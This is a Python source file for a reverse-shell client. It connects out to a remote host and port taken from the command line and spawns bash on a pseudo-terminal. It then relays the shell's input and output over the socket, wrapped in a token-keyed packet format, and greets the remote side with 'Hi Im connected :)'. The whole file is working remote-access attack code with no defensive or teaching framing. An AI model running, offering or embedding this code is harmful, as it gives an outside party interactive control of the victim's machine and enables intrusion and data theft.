import select
import threading
import subprocess

import sys
import socket
import time
import pty
import os
import random
from pkt_common import get_payload2, gen_pkt2

g_is_exit = 0

g_tk=str(random.randrange(100000,999999,1))

def remote_data_to_local(client, master_fd):
    global g_is_exit
    while True:
        if g_is_exit == 1:
            print('exit:remote_data_to_local-1')
            sys.exit(0)

        reta = select.select([client.fileno()], [], [client.fileno()], 0.5)
        if reta[0]:
            output = os.read(client.fileno(), 8192)
            command = get_payload2(output,g_tk)

            if len(command) == 0:
                continue

            os.write(master_fd, command)
        elif reta[2]:
            # exception?
            print('exit:remote_data_to_local-3')
            sys.exit(0)


def local_data_to_remote(proc, master_fd, client):
    try:
        while proc.poll() == None:
            reta = select.select([master_fd], [], [])
            if reta[0]:
                output = os.read(master_fd, 1024)
                os.write(sys.stdout.fileno(), output)
                #sys.stdout.write(output.decode('utf-8'))
                sys.stdout.flush()

                if len(output) > 0:
                    cmd = gen_pkt2(output,g_tk)
                    client.send(cmd)  # .decode('utf-8')
    except Exception as e:
        print('local_data_to_remote error:')
        print(e)

    print('exit:local_data_to_remote')
    global g_is_exit
    g_is_exit = 1
    time.sleep(2)
    client.close()
    os.close(master_fd)
    sys.exit(0)


def client_one(remote_host, remote_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((remote_host, remote_port))
    print('client connected to:', remote_host, remote_port)

    # open pseudo-terminal to interact with subprocess
    master_fd, slave_fd = pty.openpty()

    # use os.setsid() make it run in a new process group, or bash job control will not be enabled
    proc = subprocess.Popen('bash',
                            preexec_fn=os.setsid,
                            stdin=slave_fd,
                            stdout=slave_fd,
                            stderr=slave_fd,
                            universal_newlines=True
                            )

    tty_name = os.ttyname(slave_fd)
    client.send( gen_pkt2( ('Hi Im connected :)' + tty_name + '\n').encode('utf-8'), g_tk))

    t = threading.Thread(target=remote_data_to_local, args=(client, master_fd))
    t.start()

    local_data_to_remote(proc, master_fd, client)

    print('exit:client_one')
    client.close()
    sys.exit(0)


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print('usage: prog remote_host remote_port')
        sys.exit(0)
    remote_host = sys.argv[1]
    remote_port = int(sys.argv[2])
    if len(sys.argv)>3:
        g_tk = str(sys.argv[3])
    client_one(remote_host, remote_port)
